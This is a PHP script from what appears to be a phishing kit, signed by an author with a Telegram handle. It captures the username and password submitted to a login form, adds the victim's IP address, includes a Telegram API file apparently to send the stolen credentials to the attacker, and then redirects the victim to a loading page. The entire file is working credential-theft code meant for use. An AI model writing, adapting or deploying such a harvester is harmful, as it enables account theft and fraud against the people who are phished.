<?php
/**
 * @telegram   :   @Fuzzba 
 * Author      :   Fuzzba 
 */
session_start();


$InfoDATE   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$username = $_SESSION['username'] = $_POST['username'];
$password = $_SESSION['password'] = $_POST['password'];


$hexor = '@Fuzzba
username: '.$_SESSION["username"].'
password: '.$_SESSION["password"].'
ip : '.$_SERVER['REMOTE_ADDR'].' 
';







include("TelegramApi.php"); 



header('Location: ../loading.php');


?>


